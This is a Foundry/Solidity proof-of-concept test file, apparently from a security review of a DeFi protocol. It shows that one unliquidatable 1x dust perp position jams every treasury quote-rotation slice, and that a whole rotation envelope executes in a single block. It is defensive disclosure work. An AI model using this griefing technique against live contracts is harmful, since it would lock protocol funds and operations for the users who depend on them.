// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/Test.sol";
import {CauldronHook} from "../../CauldronHook.sol";
import {YBase} from "./YBase.sol";
import {PerpEngine} from "../../cauldron/PerpEngine.sol";
import {QuoteRotator} from "../../cauldron/QuoteRotator.sol";
import {TreasuryGovernor, IVotes721} from "../../cauldron/TreasuryGovernor.sol";
import {MockQuoteToken} from "../../cauldron/MockQuoteToken.sol";
import {PoolOps, IPositionManagerOps} from "../../cauldron/PoolOps.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";

/**
 *  S-0x — THE LIVE QUOTE ROTATION SURFACE, ATTACKED FROM THE VANDAL SIDE.
 *
 *  Two properties are executed here, not read:
 *
 *   A. `RedemptionExt.rotateSliceFrom` calls
 *      `IHookVolume(address(hook)).linkVolume(...)` UNCONDITIONALLY
 *      (RedemptionExt.sol:473), and `CauldronHook.linkVolume` reverts
 *      `PerpsOpen()` while `openCount > 0` (CauldronHook.sol:1623-1625). A
 *      1x-leverage position has `principal == 0`, so `_underwaterVal`
 *      (PerpEngine.sol:1349-1351) can never be true — it is UNLIQUIDATABLE —
 *      and `forceCloseDead` demands a dead generation (:1096). So one dust
 *      position nobody can remove jams every rotation slice for the life of the
 *      generation.
 *
 *   B. Nothing on the `rotateSliceFrom` path spaces slices in time. The whole
 *      30,000-bps envelope executes in ONE transaction, which is what the
 *      rotator's header claims slicing exists to prevent.
 */
contract S0x_RotationJam is YBase {
    QuoteRotator internal rotator;
    TreasuryGovernor internal governor;
    MockQuoteToken internal usdg;
    PoolKey internal route;

    function setUp() public {
        _boot(20 ether, 0);
        if (!active) return;
        _bootPerp(10 ether, 50_000_000 ether);

        usdg = new MockQuoteToken("Magic USD", "USDG", 6);
        registry.setAllowedQuote(address(usdg), true, 1e18);
        rotator = new QuoteRotator(address(registry), pm);
        governor = new TreasuryGovernor(
            IVotes721(address(new SVotes())), address(registry), address(this), 0, 0, 0, 0, false
        );
        registry.setRotationWiring(address(rotator), address(governor));
        route = _seedVenue();
        _approveEnvelope();
    }

    // -----------------------------------------------------------------------
    //  A. ONE UNLIQUIDATABLE DUST POSITION JAMS THE WHOLE ROTATION
    // -----------------------------------------------------------------------
    function test_S0x_POC_DustPerpPositionJamsEveryRotationSlice() public {
        vm.skip(!active);

        // (1) LIVENESS BASELINE: with an empty book a slice actually moves money.
        uint256 movedClean = _trySlice();

        // (2) The attacker opens the cheapest possible 1x long.
        uint256 id = _attackerOpens();
        bool liquidatable = perp.isLiquidatable(id);
        bool liqReverts = _liquidateReverts(id);
        bool forceReverts = _forceCloseReverts(id);

        // (3) Every slice now reverts, with a live envelope and a curated venue.
        (uint256 movedJammed, bytes memory jamErr) = _trySliceErr();
        uint256 openWhileJammed = perp.openCount();

        // (4) And it is the position, not the envelope: closing un-jams it.
        vm.prank(attacker);
        perp.close(id, 0);
        uint256 movedAfterClose = _trySlice();

        console2.log("clean slice moved (usdg units):", movedClean);
        console2.log("open positions while jammed:", openWhileJammed);
        console2.log("jam revert data:", vm.toString(jamErr));
        console2.log("jammed slice moved:", movedJammed);
        console2.log("moved after the attacker closed:", movedAfterClose);

        assertGt(movedClean, 0, "baseline: a slice must move value on a clean book");
        assertGt(id, 0, "the attacker holds a position");
        assertFalse(liquidatable, "a 1x position is never underwater: principal == 0");
        assertTrue(liqReverts, "liquidate() must refuse a solvent 1x position");
        assertTrue(forceReverts, "forceCloseDead() must refuse a LIVE generation");
        assertEq(openWhileJammed, 1, "exactly one dust position was open");
        assertEq(movedJammed, 0, "JAM: the rotation slice reverted while the dust position was open");
        assertEq(
            jamErr, abi.encodeWithSelector(CauldronHook.PerpsOpen.selector),
            "and it reverted with the hook's PerpsOpen interlock, not for some other reason"
        );
        assertGt(movedAfterClose, 0, "and it was the position that jammed it");
    }

    // -----------------------------------------------------------------------
    //  B. NO TIME SPACING: A WHOLE ENVELOPE IN ONE TRANSACTION
    // -----------------------------------------------------------------------
    function test_S0x_POC_WholeEnvelopeExecutesInOneBlock() public {
        vm.skip(!active);

        uint256 startBlock = vm.getBlockNumber();
        uint256 startTs = vm.getBlockTimestamp();

        uint256 slices;
        uint256 movedTotal;
        for (uint256 i; i < 12; ++i) {
            uint256 m = _trySlice();
            if (m == 0) break;
            slices++;
            movedTotal += m;
        }

        console2.log("slices in a single block:", slices);
        console2.log("usdg moved in a single block:", movedTotal);

        assertEq(vm.getBlockNumber(), startBlock, "same block");
        assertEq(vm.getBlockTimestamp(), startTs, "same timestamp");
        assertGe(slices, 5, "an unthrottled envelope: many slices, one block, no interval");
        assertGt(movedTotal, 0, "and real value moved");
    }

    // -----------------------------------------------------------------------
    //  Helpers — every conditional lives here, so the tests above end in
    //  assertions on locals rather than in an early `return`.
    // -----------------------------------------------------------------------

    /// @return moved the destination units this slice actually converted, or 0 if
    ///         the call reverted.
    function _trySlice() internal returns (uint256 moved) {
        try registry.rotateSlice(2500, 0, route) returns (uint256 m, uint256) {
            moved = m;
        } catch {
            moved = 0;
        }
    }

    function _trySliceErr() internal returns (uint256 moved, bytes memory err) {
        try registry.rotateSlice(2500, 0, route) returns (uint256 m, uint256) {
            moved = m;
        } catch (bytes memory e) {
            err = e;
        }
    }

    function _attackerOpens() internal returns (uint256 id) {
        uint256 amount = 0.01 ether; // > minCollateral (0.003) after the open fee
        vm.prank(attacker, attacker);
        id = perp.openLong{value: amount}(1, 0, 0, amount);
    }

    function _liquidateReverts(uint256 id) internal returns (bool reverted) {
        vm.prank(attacker);
        try perp.liquidate(id) { reverted = false; } catch { reverted = true; }
    }

    function _forceCloseReverts(uint256 id) internal returns (bool reverted) {
        try perp.forceCloseDead(id) { reverted = false; } catch { reverted = true; }
    }

    function _approveEnvelope() internal {
        uint256 id = governor.propose(address(usdg), governor.MAX_ENVELOPE_BPS());
        vm.roll(vm.getBlockNumber() + 1);
        governor.vote(id, true);
        _warp(governor.VOTING_PERIOD() + 1);
        governor.execute(id);
    }

    /// @dev A deep, curated ETH/USDG venue. The allowlist fails closed.
    function _seedVenue() internal returns (PoolKey memory k) {
        uint256 venueUsdg = 400_000e6;
        usdg.mint(address(this), venueUsdg);
        PoolOps.openOrAddPair(
            pm, IPositionManagerOps(posm), address(0),
            address(usdg), address(0), 40 ether, venueUsdg, 60, 3000
        );
        k = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(address(usdg)),
            fee: 3000, tickSpacing: 60, hooks: IHooks(address(0))
        });
        rotator.setVenue(k, true);
    }
}

contract SVotes {
    function getVotes(address) external pure returns (uint256) { return 1000; }
    function getPastVotes(address, uint256) external pure returns (uint256) { return 1000; }
    function getPastTotalSupply(uint256) external pure returns (uint256) { return 1000; }
    function balanceOf(address) external pure returns (uint256) { return 1000; }
}
